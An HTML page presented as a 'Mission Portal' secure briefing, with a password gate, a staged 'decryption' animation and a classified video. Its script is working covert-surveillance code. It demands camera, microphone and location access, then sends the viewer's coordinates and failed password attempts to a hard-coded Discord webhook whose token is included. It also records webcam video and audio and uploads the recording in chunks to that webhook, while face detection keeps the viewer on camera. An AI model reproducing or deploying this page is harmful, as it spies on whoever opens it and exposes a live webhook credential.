<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>Mission Portal – Secure Briefing (v3.5)</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />

<style>
/* ===== TOKENS & BASE ===== */
:root{
 --bg1:#0d0d14;--bg2:#07121d;--accent:#00bfff;--danger:#ff3030;--success:#00e676;
 --txt:#e0e6eb;--muted:#9aa5b1;--ff:"Poppins",system-ui,sans-serif;--ffd:"Orbitron",sans-serif;
 --br-lg:18px;--br-md:12px;--shadow:0 10px 25px rgba(0,0,0,.6);
}
@keyframes grad{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}
@keyframes pulse{0%,100%{opacity:.6}50%{opacity:1}}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
@keyframes crt{0%,100%{opacity:.9}50%{opacity:.7}}
html,body{height:100%;margin:0}
body{
 font-family:var(--ff);color:var(--txt);
 background:linear-gradient(135deg,var(--bg1),var(--bg2));
 background-size:400% 400%;animation:grad 20s linear infinite;
 display:flex;flex-direction:column;overflow:hidden;user-select:none
}
#viewport{flex:1;display:flex;align-items:center;justify-content:center;padding:2rem}

/* ===== PANEL ===== */
.panel{
 width:100%;max-width:520px;padding:2.5rem;text-align:center;
 background:rgba(255,255,255,.05);border-radius:var(--br-lg);box-shadow:var(--shadow),inset 0 0 15px rgba(255,255,255,.05);
 backdrop-filter:blur(14px) brightness(1.05);display:none;animation:fadeIn .5s forwards
}
.panel.active{display:block}
.panel h1{font-family:var(--ffd);margin:0 0 1rem;font-size:2rem}
.panel p{color:var(--muted);margin-bottom:2rem}
input[type=password],button.primary{
 width:100%;padding:.85rem 1rem;font-size:1rem;border:none;border-radius:var(--br-md);outline:none
}
input[type=password]{background:rgba(255,255,255,.08);color:var(--txt);margin-bottom:1.5rem}
button.primary{background:var(--accent);color:#000;font-weight:600;cursor:pointer;margin-bottom:.75rem}
button.primary:disabled{opacity:.4;cursor:not-allowed}
.error{color:var(--danger);min-height:1.3rem;font-size:.9rem}

/* ===== PREVIEW ===== */
#webcam-preview{width:100%;border-radius:var(--br-md);box-shadow:0 0 15px rgba(0,191,255,.3);margin-bottom:1.5rem}

/* ===== DECRYPT ===== */
#decrypt-log{
 text-align:left;font-family:"Courier New",monospace;color:var(--success);
 background:rgba(0,0,0,.7);padding:1rem;height:160px;border-radius:var(--br-md);overflow:hidden;margin-bottom:1rem;font-size:.85rem
}
progress{width:100%;height:18px;border:none;border-radius:var(--br-md);background:rgba(255,255,255,.1)}
progress::-webkit-progress-value{background:var(--success)}

/* ===== VIDEO ===== */
#video-layer{position:fixed;inset:0;display:none;z-index:900}
#video-layer.active{display:block}
#mission-video{width:100%;height:100%;object-fit:cover;filter:brightness(1.12)}
.overlay{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:space-between;pointer-events:none}
.watermark{align-self:flex-end;margin:1.5rem;font-family:var(--ffd);font-size:2rem;color:var(--danger);text-shadow:0 0 10px var(--danger);animation:pulse 2s infinite}
.dynamic{align-self:flex-start;margin:1.5rem;font-size:1rem;color:var(--danger)}
#face-warning{
 position:absolute;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(4px);
 display:none;align-items:center;justify-content:center;font-size:2rem;font-weight:600;color:var(--danger);text-shadow:0 0 10px var(--danger)
}

/* ===== WARNING ===== */
#alert-panel {
  padding: 2.25rem 2rem 2.75rem;
  position: relative;
  filter: drop-shadow(0 0 28px rgba(255, 48, 48, 0.65));
}

#alert-panel h1 {
  margin-bottom: 1.75rem;
  font-size: 1.55rem;               /* scales better */
  line-height: 1.3;
  letter-spacing: 2px;
  word-break: break-word;           /* wrap long word */
  white-space: normal;
  text-align: center;
}

#alert-panel p {
  font-size: 1.05rem;
  line-height: 1.45;
}

@media (max-width: 480px) {
  #alert-panel h1 { font-size: 1.35rem; letter-spacing: 1.5px; }
  #alert-panel p  { font-size: 0.95rem; }
  .panel          { padding: 2rem 1.5rem; }
}

/* ===== TERMINATION ===== */
.terminated{
 position:absolute;inset:0;display:flex;align-items:center;justify-content:center;text-align:center;font-family:var(--ffd);
 background:radial-gradient(circle at center,rgba(255,0,0,.22),rgba(0,0,0,.88));animation:fadeIn .5s forwards
}
.terminated h1{font-size:3rem;margin:0;letter-spacing:3px;text-shadow:0 0 15px var(--danger)}
.terminated p{margin-top:.6rem;color:var(--muted)}
</style>
</head>

<body oncontextmenu="return false">
<div id="viewport">
  <!-- PERMISSION -->
  <section class="panel active" id="perm-panel">
    <h1>Initial Security Check</h1>
    <p>Camera <strong>+ audio</strong> <br> and location are mandatory.</p>
    <video id="webcam-preview" autoplay muted playsinline></video>
    <button class="primary" id="perm-continue" disabled>Continue</button>
    <div class="error" id="perm-error"></div>
  </section>

  <!-- LOGIN -->
  <section class="panel" id="login-panel">
    <h1>Mission Portal</h1>
    <p>Enter one-time password</p>
    <input type="password" id="pwd" placeholder="Password">
    <button class="primary" id="decrypt-btn">Decrypt</button>
    <div class="error" id="login-error"></div>
  </section>

  <!-- DECRYPT -->
  <section class="panel" id="decrypt-panel">
    <h1>Decrypting …</h1>
    <div id="decrypt-log"></div>
    <progress id="decrypt-progress" value="0" max="100"></progress>
  </section>

  <!-- WARNING -->
  <section class="panel" id="alert-panel">
    <h1>UNAUTHORIZED&nbsp;RECORDING&nbsp;DETECTED</h1>
    <p>Counter-surveillance triggered.<br>Mission will reset.</p>
  </section>
</div>

<!-- FULLSCREEN VIDEO -->
<div id="video-layer">
  <video id="mission-video" autoplay playsinline disablepictureinpicture controlslist="nodownload nofullscreen"></video>
  <div class="overlay">
    <div class="watermark">CLASSIFIED</div>
    <div class="dynamic" id="dyn-mark"></div>
  </div>
  <div id="face-warning">SHOW YOUR FACE TO CONTINUE</div>
  <video id="face-feed" autoplay muted playsinline style="display:none"></video>
</div>

<script>
/* ===== CONFIG ===== */
const WH   = "https://discord.com/api/webhooks/1379451829116600481/rBfx4dEdwNAzaF3mR3UCX1FhpUhzEjZctUaCHOdTSDI7gMMK3AtdxF0pBXmBnd3cKJCr";  // ← replace
const VID  = "https://video.wixstatic.com/video/fcb4a6_4843089a817c4ad38e7dc0bd86cc98ca/1080p/mp4/file.mp4";
const MAX  = 7_864_320;   // 7.5 MB in bytes
const WARN = "missionWarnedOnce";
const TERM = "missionUsed";

/* ===== STATE ===== */
let SID = sid(); let camStream, mediaRec, chunks=[], size=0, faceInt, done=false;
let allowGeo=false, allowMedia=false, tries=0;

/* ===== SHORTHANDS ===== */
const $ = q=>document.querySelector(q);
const log = m=>fetch(WH,{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify({content:`[${SID}] ${m}`})}).catch(()=>{});
function sid(){return"xxxx-4xxx-yxxx".replace(/[xy]/g,c=>(Math.random()*16|0).toString(16))}
function panel(id){document.querySelectorAll(".panel").forEach(p=>p.classList.remove("active"));$(id).classList.add("active");}

/* ===== PERMISSIONS ===== */
async function getPermissions(){
  try{
    camStream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
    $("#webcam-preview").srcObject = camStream;
    allowMedia = true; log("media ok");
    navigator.geolocation.getCurrentPosition(
      pos=>{allowGeo=true;log(`geo ${pos.coords.latitude.toFixed(4)},${pos.coords.longitude.toFixed(4)}`);ready();},
      ()=>{$("#perm-error").textContent="Location denied";log("geo denied");}
    );
    ready();
  }catch(e){
    $("#perm-error").textContent="Camera & mic denied";
    log("media denied");
  }
}
function ready(){ if(allowMedia && allowGeo) $("#perm-continue").disabled=false; }

/* ===== RECORDING (adaptive) ===== */
function startRec() {
  try {
    mediaRec = new MediaRecorder(
      camStream,
      { mimeType: "video/webm;codecs=vp8,opus" }
    );

    mediaRec.ondataavailable = e => {
      if (!e.data.size) return;
      chunks.push(e.data);
      size += e.data.size;
      if (size >= MAX) flush();              // send mid-session bundles
    };

    mediaRec.onstop = () => flush();         // ← NEW: final bundle

    mediaRec.start(1000);                    // gather 1-s slices
    log("rec start");
  } catch { log("rec error"); }
}
function flush(){
  if(!chunks.length) return;
  const blob = new Blob(chunks,{type:"video/webm"});
  send(blob); chunks=[]; size=0;
}
function send(b){const fd=new FormData();fd.append("file",b,`c_${Date.now()}.webm`);
 fetch(WH,{method:"POST",body:fd}).catch(()=>{});}
function stopRec() {
  if (mediaRec?.state !== "inactive") mediaRec.stop(); // onstop->flush()
  log("rec stop");
}

/* ===== FACE MONITOR ===== */
function watchFace(){
  if(!("FaceDetector" in window)){log("no FaceDetector");return;}
  const det = new FaceDetector({fastMode:true}), feed=$("#face-feed");
  faceInt = setInterval(async()=>{
    try{
      const faces = await det.detect(feed);
      if(faces.length){$("#face-warning").style.display="none";$("#mission-video").play().catch(()=>{});}
      else{$("#face-warning").style.display="flex";$("#mission-video").pause();}
    }catch{}
  },1200);
}

/* ===== TERMINATION ===== */
function terminate(){
  if(done) return; done=true;
  clearInterval(faceInt); stopRec(); camStream?.getTracks().forEach(t=>t.stop());
  localStorage.setItem(TERM,"yes"); log("terminated");
  const d=document.createElement("div");d.className="terminated";
  d.innerHTML="<h1>SESSION TERMINATED</h1><p>Resetting…</p>";
  $("#video-layer").appendChild(d); setTimeout(()=>location.reload(),3500);
}

/* ===== DECRYPT ===== */
function decrypt(){
  const lines=[
    "Initializing cipher…","Negotiating TLS 1.3…","Injecting quantum noise…",
    "Verifying SHA-512 hash…","Decrypting block 1…","Decrypting block 2…",
    "Decrypting block 3…","Reassembling payload…","Checksum OK ✔",
    "Writing secure buffer…","Hardening memory…","Decryption complete ✅"
  ];
  let i=0; $("#decrypt-log").innerHTML=""; $("#decrypt-progress").value=0;
  const iv=setInterval(()=>{
    if(i<lines.length){
      $("#decrypt-log").innerHTML+=`<p>${lines[i]}</p>`;
      $("#decrypt-log").scrollTop=$("#decrypt-log").scrollHeight;
      $("#decrypt-progress").value=(++i)*100/lines.length;
    }else{
      clearInterval(iv);
      if(!localStorage.getItem(WARN)){
        panel("#alert-panel"); log("warn panel"); localStorage.setItem(WARN,"yes");
        setTimeout(()=>location.reload(),5000);
      }else{launch();}
    }
  },1100);
}

/* ===== AUTH ===== */
function auth(){
  const pw=$("#pwd").value, err=$("#login-error"); err.textContent="";
  if(pw==="OneTimeSecret2024!"){panel("#decrypt-panel"); decrypt();}
  else{tries++; err.textContent=tries>=3?"Locked":`Wrong (${3-tries} left)`; log(`bad pw ${tries}`); if(tries>=3) $("#decrypt-btn").disabled=true;}
}

/* ===== VIDEO ===== */
function launch(){
  $("#video-layer").classList.add("active");
  $("#mission-video").src = VID;
  $("#face-feed").srcObject = camStream;

  startRec(); watchFace(); log("video play");
  setInterval(()=>$("#dyn-mark").textContent=`${SID} | ${new Date().toLocaleTimeString()}`,1000);

  $("#mission-video").onended = ()=>{stopRec(); terminate();}
}

/* ===== BOOT CHECK ===== */
if(localStorage.getItem(TERM)==="yes"){
  document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;color:#fff;font-family:sans-serif"><h1>ACCESS EXPIRED</h1></div>';
  log("reopen attempt"); throw"expired";
}

/* ===== EVENTS ===== */
$("#perm-continue").onclick = ()=>{panel("#login-panel"); log("perm ok"); startRec();};
$("#decrypt-btn").onclick   = auth;
document.addEventListener("keydown",e=>{if(e.key==="Enter"&&$("#login-panel").classList.contains("active"))auth()});
window.addEventListener("beforeunload",()=>{stopRec(); camStream?.getTracks().forEach(t=>t.stop());});

/* ===== START ===== */
getPermissions();
</script>
</body>
</html>
